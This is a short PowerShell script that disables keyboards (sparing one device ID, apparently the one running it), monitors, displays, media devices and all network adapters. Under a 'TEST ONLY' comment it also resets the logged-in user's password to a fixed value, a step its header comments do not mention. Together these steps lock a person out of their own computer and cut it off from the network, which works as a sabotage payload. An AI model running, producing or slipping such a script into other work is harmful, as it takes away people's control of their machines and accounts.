# - Queries connected hardware devices by class (Keyboard, Monitor, Media, Display)
# - Disables selected device categories using Windows PnP management
# - Disables network adapters temporarily
Get-PnpDevice -Class 'Keyboard' | Where-Object {$_.InstanceId -notlike '*239A*'} | Disable-PnpDevice
Get-PnpDevice -Class 'Monitor' | Disable-PnpDevice

Get-PnpDevice -Class "Media" | Disable-PnpDevice -Confirm:$false

Get-NetAdapter | Disable-NetAdapter -Confirm:$false


# TEST ONLY — modifies local user password.
net user $env:username NewPassword123

Get-PnpDevice -Class 'Display' | Disable-PnpDevice
